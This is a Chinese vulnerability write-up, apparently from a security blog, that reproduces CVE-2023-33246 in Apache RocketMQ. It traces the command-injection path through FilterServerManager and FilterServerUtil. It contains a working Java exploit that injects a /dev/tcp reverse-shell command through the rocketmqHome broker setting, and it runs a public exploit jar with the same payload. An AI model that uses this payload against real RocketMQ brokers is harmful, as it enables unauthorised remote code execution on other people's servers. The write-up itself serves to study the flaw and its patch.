## 1.了解RocketMQ

> RocketMQ是一款低延迟、高并发、高可用、高可靠的 **分布式消息中间件**

下面画个图简单理解一下RocketMQ的消息收发模型  
![image-20230620214924751.png](https://image.3001.net/images/20230624/1687578585_649667d9136670f843216.png!small)  
与漏洞相关的点：[参考](https://paper.seebug.org/2081/#1)

  * Broker节点启动后会在NameServer节点进行注册。

  *  **DefaultMQAdminExt类** 可以通过与 NameServer 交互来获取和修改相关配置信息。

  *  **FilterServerManager类** 用于管理过滤服务器（Filter Server）的类。过滤服务器负责处理消息过滤规则的注册、更新和删除，以及消息过滤的评估和匹配。(产生漏洞的类)

## 2.环境搭建

参考[RocketMQ 最新漏洞手把手复现
CVE-2023-33246](https://mp.weixin.qq.com/s/tm8oxZwwPdpiRtOv3wYJIw)

  * docker 拉取镜像

    
    
    docker pull apache/rocketmq:4.9.1
    docker pull apacherocketmq/rocketmq-console:2.0.0
    

  * 启动NameServer

    
    
    docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.1 sh mqnamesrv
    

  * 创建一个broker配置文件 D:\Temp\conf\broker.conf

    
    
    brokerClusterName = DefaultCluster 
    brokerName = broker-a 
    brokerId = 0 
    deleteWhen = 04 
    fileReservedTime = 48 
    brokerRole = ASYNC_MASTER 
    flushDiskType = SYNC_FLUSH
    
    
    brokerIP1 = 127.0.0.1
    

  * 启动 Broker

    
    
    docker run -d -p 10911:10911 -p 10909:10909 -v D:/Temp/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -e "MAX_POSSIBLE_HEAP=200000000" apache/rocketmq:4.9.1 sh mqbroker -c /opt/rocketmq/conf/broker.conf
    

  * 启动console

    
    
    docker run -dit --name mqconsole -p 8080:8080 -e "JAVA_OPTS=-Drocketmq.config.namesrvAddr=mqsrv:9876 -Drocketmq.config.isVIPChannel=false" apacherocketmq/rocketmq-console:2.0.0
    

访问http://127.0.0.1:8080/  
![image-20230613102306055.png](https://image.3001.net/images/20230624/1687578640_64966810620290606594b.png!small)  
使用CVE-2023-33246[漏洞利用工具](https://github.com/Serendipity-Lucky/CVE-2023-33246)攻击一下试试

    
    
    java -jar CVE-2023-33246.jar -ip "127.0.0.1" -cmd "bash -i >& /dev/tcp/host.docker.internal/9999  0>&1"
    

![image-20230613153820281.png](https://image.3001.net/images/20230624/1687578673_64966831c7f5ce76c7172.png!small)  
收到反弹的shell  
![image-20230613153852956.png](https://image.3001.net/images/20230624/1687578685_6496683dc7d84f3cdb757.png!small)

## 3.漏洞分析

参考：https://mp.weixin.qq.com/s/1GIATpldq29cVTR6Rw_DTw

参考：https://xz.aliyun.com/t/12589

我们通过查看漏洞的[补丁](https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc#diff-90b2c9df4cdd6dacc2cbccf461d3677f4fc0b83a209b055e9ad27729bffe646e)，发现
**FilterServerManager** 和 **FilterServerUtil** 整个文件都被删除了  
![image-20230620221836214.png](https://image.3001.net/images/20230624/1687578714_6496685a46954ddb49c39.png!small)  
![image-20230620221014974.png](https://image.3001.net/images/20230624/1687578724_64966864308041aad73e2.png!small)  
下载其上一个版本的[代码](https://github.com/apache/rocketmq/tree/7676cd9366a3297925deabcf27bb590e34648645)，来分析一下漏洞产生的原因

首先查看被删除的两个文件

    
    
    public class FilterServerUtil {
        public static void callShell(final String shellString, final InternalLogger log) {
            Process process = null;
            try {
                String[] cmdArray = splitShellString(shellString);
                process = Runtime.getRuntime().exec(cmdArray);
                ......
            } ......
        }
    
        private static String[] splitShellString(final String shellString) {
            return shellString.split(" ");
        }
    }
    

在 **FilterServerUtil类** 的 **callShell方法**
中使用了`Runtime.getRuntime().exec(cmdArray)`执行系统命令，并且执行的命令来自该函数的形参`shellString`

这样的话，如果找到一条调用链可以调用到callShell方法，并且参数可控，就可以造成RCE  
![image-20230623211016862.png](https://image.3001.net/images/20230624/1687578758_6496688642fcb9417746e.png!small)  
在FilterServerManager的createFilterServer()中调用了callShell方法

    
    
    public void createFilterServer() {
            int more =
                this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
            String cmd = this.buildStartCommand();
            for (int i = 0; i < more; i++) {
                FilterServerUtil.callShell(cmd, log);
            }
        }
    

**createFilterServer** 方法调用了 **callShell** 方法执行命令

 **createFilterServer** 方法做了三件事：

  * 获取配置计算了一个int型变量`more`

  * 调用`buildStartCommand()`构造一个需要执行的命令的字符串

  * 当`more`大于0时，调用了`callShell`方法执行命令

    
    
    private String buildStartCommand() {
            String config = "";
            if (BrokerStartup.configFile != null) {
                config = String.format("-c %s", BrokerStartup.configFile);
            }
    
            if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
                config += String.format(" -n %s", this.brokerController.getBrokerConfig().getNamesrvAddr());
            }
    
            if (RemotingUtil.isWindowsPlatform()) {
                return String.format("start /b %s\\bin\\mqfiltersrv.exe %s",
                    this.brokerController.getBrokerConfig().getRocketmqHome(),
                    config);
            } else {
                return String.format("sh %s/bin/startfsrv.sh %s",
                    this.brokerController.getBrokerConfig().getRocketmqHome(),
                    config);
            }
        }
    

在 **buildStartCommand()** 中有问题的是`String.format("sh %s/bin/startfsrv.sh %s",
this.brokerController.getBrokerConfig().getRocketmqHome(),config);`这一部分

这句代码的作用是获取配置中的`RocketmqHome`，然后替换掉`sh %s/bin/startfsrv.sh %s`的第一个`%s`

如果我们能控制配置中的`RocketmqHome`,那么就可以拼接上前面的`sh`，执行任意命令

给出漏洞的调用链：`FilterServerManager.start() -->
FilterServerManager.createFilterServer() --> FilterServerUtil.callShell(cmd,
log)`

## 4.构造payload

分析完漏洞的原理后，我们来尝试构造payload，通过上面我们得知，

利用漏洞的重要条件是可以 **控制配置中的`RocketmqHome`**

在第一小节我们了解到 **DefaultMQAdminExt类** 可以通过与 NameServer 交互来获取和修改相关配置信息。  
![image-20230624095106656.png](https://image.3001.net/images/20230624/1687578835_649668d305639664b7a90.png!small)  
 **DefaultMQAdminExt类** 的`updateBrokerConfig`方法可以更新Broker的配置，需要传一个
**Broker的地址** 和一个 **Properties类型的参数**

那么，我们构造payload可以分三步

  * 创建 Properties 对象

    * 设置`rocketmqHome`配置，为我们拼接任意命令使用

    * 设置`filterServerNums`配置，要使得`more=filterServerNums-filterServerTable.size`大于0

  * 创建DefaultMQAdminExt 对象

  * 更新配置⽂件

    
    
    public static void main(String[] args) throws Exception {
            // 创建 Properties 对象
            Properties props = new Properties();
            String cmd = "bash -i >& /dev/tcp/host.docker.internal/9999  0>&1";
            props.setProperty("rocketmqHome","-c $@|sh . echo " + cmd + ";");
            props.setProperty("filterServerNums","1");
            // 创建 DefaultMQAdminExt 对象并启动
            DefaultMQAdminExt admin = new DefaultMQAdminExt();
            admin.setNamesrvAddr("127.0.0.1:9876");
            admin.start();
            // 更新配置⽂件
            admin.updateBrokerConfig("127.0.0.1:10911", props);
    
            // 关闭 DefaultMQAdminExt 对象
            admin.shutdown();
    
        }
    

关于反弹shell的写法可以参照这位[大佬](https://www.jianshu.com/p/ae3922db1f70)

